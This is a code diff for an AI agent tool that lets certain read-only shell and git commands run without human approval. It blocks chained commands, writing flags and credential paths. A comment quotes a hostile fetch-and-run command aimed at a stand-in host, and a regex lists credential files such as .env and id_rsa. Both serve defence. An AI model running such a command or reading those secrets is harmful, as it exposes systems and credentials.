@@ -77,16 +77,56 @@ const APPROVAL_GATED_NAMES = new Set(
 // interpreter must be python, and any shell metacharacter (; | & > < $ `) or a
 // newline disqualifies the whole command, so a chained `; curl evil | sh` can
 // never ride on the allowlist.
+//
+// Inside an agent turn the model routinely runs `ls`/`cat`/`grep` just to look
+// at something, and prompting a human for those turned every single-task chat
+// into an approval dialog. Those calls are now unattended, but only when the
+// command cannot write: one whitelisted program, no separator/redirect/
+// substitution, no writing flag (`find -delete`, `find -exec`), and no
+// credential path (`cat .env`, `id_rsa`) — a read-only gate is still the only
+// thing standing between the model and key material.
+const READ_ONLY_PROGRAMS = new Set([
+  'ls', 'cat', 'head', 'tail', 'wc', 'grep', 'rg', 'find', 'pwd', 'stat',
+  'file', 'du', 'which', 'diff',
+])
+const GIT_READ_SUBCOMMANDS = new Set([
+  'status', 'diff', 'log', 'show', 'rev-parse', 'ls-files', 'blame',
+  'describe', 'shortlog',
+])
+// Flags that turn an otherwise read-only program into a writer.
+const WRITE_FLAGS = new Set([
+  '-delete', '-exec', '-execdir', '-ok', '-okdir',
+  '-fprint', '-fprintf', '-fls',
+])
+// Key material and env files: `.env.example` is a template, everything else is
+// treated as secret (mirrors isSensitivePath used by read-file/write-file).
+const SECRET_TOKEN = /(?:^|[^A-Za-z0-9_.-])(?:\.env(?!\.example|\.sample)|\.ssh|id_rsa|id_ed25519|\.pem|\.key|credentials|\.netrc|\.npmrc|\.pypirc)/i
+
 function isReadOnlyShell(args) {
   const cmd = String((args && args.command) || '').trim()
   if (!cmd || /[;|&<>$`\n]/.test(cmd)) return false
-  const m = /^(?:python3|python)\s+(\S+)(?:\s.*)?$/.exec(cmd)
-  if (!m) return false
-  const target = m[1]
-  if (!/\/scripts\/stats\.py$/.test(target)) return false
-  const real = realOrSelf(target)
-  const root = realOrSelf(SOULS_DIR) + path.sep
-  return real.startsWith(root) && real.endsWith('/scripts/stats.py')
+  if (SECRET_TOKEN.test(cmd)) return false
+  const tokens = cmd.split(/\s+/)
+  const prog = tokens[0]
+  if (prog === 'python3' || prog === 'python') {
+    // One pre-existing exception: the analysis script under the souls tree.
+    const target = tokens[1] || ''
+    if (!/\/scripts\/stats\.py$/.test(target)) return false
+    const real = realOrSelf(target)
+    const root = realOrSelf(SOULS_DIR) + path.sep
+    return real.startsWith(root) && real.endsWith('/scripts/stats.py')
+  }
+  if (prog === 'git') {
+    // `git -c …` sits before the subcommand, so only a literal subcommand at
+    // position 1 counts; anything else stays gated.
+    return GIT_READ_SUBCOMMANDS.has(tokens[1] || '')
+  }
+  if (!READ_ONLY_PROGRAMS.has(prog)) return false
+  for (const t of tokens.slice(1)) {
+    const name = t.split('=')[0]
+    if (WRITE_FLAGS.has(name)) return false
+  }
+  return true
 }
 
 function needsApproval(name, args) {
